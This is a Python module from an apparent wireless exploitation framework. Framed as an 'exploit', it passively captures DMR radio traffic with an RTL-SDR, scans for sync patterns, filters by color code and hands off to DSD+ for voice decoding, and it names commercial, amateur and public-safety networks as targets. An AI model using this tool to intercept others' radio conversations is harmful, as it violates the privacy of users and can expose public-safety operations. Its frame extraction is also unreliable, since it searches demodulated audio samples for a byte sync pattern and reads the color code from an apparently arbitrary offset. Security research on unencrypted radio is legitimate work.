# Author: André Henrique (LinkedIn/X: @mrhenrike)
import struct
import subprocess
import time

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """DMR (Digital Mobile Radio) Passive Voice Sniffing.

    DMR (ETSI TS 102 361) is widely used by commercial, amateur,
    and public-safety radio systems.  Many DMR deployments operate
    without encryption or use basic XOR scrambling that is trivially
    reversible.  This module captures DMR traffic via SDR, extracts
    AMBE+2 voice frames, and decodes them using DSD (Digital Speech
    Decoder) or DSD+.

    DMR uses 4FSK modulation on 12.5 kHz channels, typically in the
    UHF 400-470 MHz band (Tier II/III) or 136-174 MHz VHF.

    Hardware requirements:
    - RTL-SDR V3 dongle ($25) or better SDR (Airspy, USRP)
    - UHF antenna tuned to 400-470 MHz (e.g., Nagoya NA-771)
    - For VHF: antenna tuned to 136-174 MHz
    - DSD+ (Digital Speech Decoder Plus) for AMBE+2 decoding
    - Virtual audio cable or PulseAudio for audio routing

    Author: Andre Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "DMR Passive Voice Sniffing via SDR",
        "description": (
            "Passively captures and decodes DMR (Digital Mobile Radio) "
            "voice traffic using RTL-SDR or compatible SDR with UHF "
            "antenna (400-470 MHz).  Extracts AMBE+2 voice frames "
            "from 4FSK modulated 12.5 kHz channels.  Many DMR systems "
            "transmit unencrypted or use trivial XOR scrambling.  "
            "Requires DSD/DSD+ for voice decoding."
        ),
        "authors": (
            "Andre Henrique (@mrhenrike)",
        ),
        "references": (
            "https://www.etsi.org/technologies/digital-mobile-radio",
            "https://github.com/szechyjs/dsd",
            "https://github.com/f4exb/dsdcc",
        ),
        "disclosure_date": "2020-01-01",
        "platform": "linux",
        "arch": "all",
        "privileged": True,
        "targets": (
            "DMR Tier II/III networks (commercial, amateur)",
            "Unencrypted or XOR-scrambled DMR traffic",
        ),
    }

    target = OptIP("", "Target DMR frequency in MHz or 'scan'")
    port = OptPort(1, "Not used (radio capture)")
    timeout = OptFloat(60.0, "Capture duration in seconds")
    frequency = OptFloat(438.5, "Center frequency in MHz (UHF DMR)")
    sample_rate = OptFloat(2.4, "Sample rate in MHz")
    gain = OptFloat(38.0, "SDR gain in dB")
    color_code = OptInteger(1, "DMR color code filter (1-15, 0=any)")
    talk_group = OptInteger(0, "Talk group filter (0=any)")
    output_dir = OptString("/tmp/dmr_sniff", "Output directory for decoded audio")

    _DMR_UHF_START = 400.0
    _DMR_UHF_END = 470.0
    _DMR_VHF_START = 136.0
    _DMR_VHF_END = 174.0
    _CHANNEL_BW_KHZ = 12.5
    _DMR_SYNC_PATTERN = bytes([0x07, 0x55, 0xFD, 0x7D, 0xF7, 0x5F])

    def _validate_frequency(self) -> bool:
        freq = float(self.frequency)
        in_uhf = self._DMR_UHF_START <= freq <= self._DMR_UHF_END
        in_vhf = self._DMR_VHF_START <= freq <= self._DMR_VHF_END
        return in_uhf or in_vhf

    def _start_rtl_fm(self) -> subprocess.Popen | None:
        """Start rtl_fm for narrowband FM demodulation of DMR signal."""
        freq_hz = int(float(self.frequency) * 1e6)
        cmd = [
            "rtl_fm",
            "-f", str(freq_hz),
            "-s", "48000",
            "-g", str(int(float(self.gain))),
            "-M", "raw",
            "-",
        ]
        try:
            return subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        except OSError:
            return None

    def _extract_dmr_frames(self, raw_audio: bytes) -> list:
        """Extract DMR frames by searching for sync patterns."""
        frames = []
        offset = 0
        sync_len = len(self._DMR_SYNC_PATTERN)
        while offset + sync_len + 33 <= len(raw_audio):
            if raw_audio[offset:offset + sync_len] == self._DMR_SYNC_PATTERN:
                frame = raw_audio[offset:offset + 33]
                frames.append(frame)
                offset += 33
            else:
                offset += 1
        return frames

    def _decode_color_code(self, frame: bytes) -> int:
        """Extract color code from DMR CACH (Common Announcement Channel)."""
        if len(frame) < 4:
            return 0
        return (frame[3] >> 4) & 0x0F

    @mute
    def check(self) -> bool:
        """Verify rtl_fm and DSD availability."""
        try:
            result = subprocess.run(
                ["rtl_fm", "--help"],
                capture_output=True,
                timeout=5,
            )
            return result.returncode in (0, 1)
        except (OSError, subprocess.TimeoutExpired):
            return False

    def run(self) -> None:
        if not self._validate_frequency():
            print_error(
                f"Frequency {self.frequency} MHz outside DMR bands "
                f"(UHF: {self._DMR_UHF_START}-{self._DMR_UHF_END}, "
                f"VHF: {self._DMR_VHF_START}-{self._DMR_VHF_END})"
            )
            return

        print_success(
            f"DMR passive sniff on {self.frequency} MHz "
            f"(color code: {self.color_code}, talk group: {self.talk_group})"
        )
        self._exploit()

    def _exploit(self) -> None:
        proc = self._start_rtl_fm()
        if proc is None:
            print_error("Failed to start rtl_fm (not found or SDR busy)")
            return

        print_status(f"Capturing DMR traffic for {self.timeout} seconds...")
        try:
            raw_audio, _ = proc.communicate(timeout=float(self.timeout) + 5)
        except subprocess.TimeoutExpired:
            proc.kill()
            raw_audio, _ = proc.communicate()

        print_info(f"Captured {len(raw_audio)} bytes of raw audio")

        frames = self._extract_dmr_frames(raw_audio)
        print_info(f"Extracted {len(frames)} DMR frames")

        filtered = frames
        if self.color_code > 0:
            filtered = [f for f in frames if self._decode_color_code(f) == self.color_code]
            print_info(f"Filtered to {len(filtered)} frames with color code {self.color_code}")

        if filtered:
            print_success(
                f"DMR traffic captured: {len(filtered)} voice/data frames. "
                "Pipe through DSD+ for AMBE+2 voice decoding."
            )
        else:
            print_info("No DMR frames found. Check frequency and antenna.")
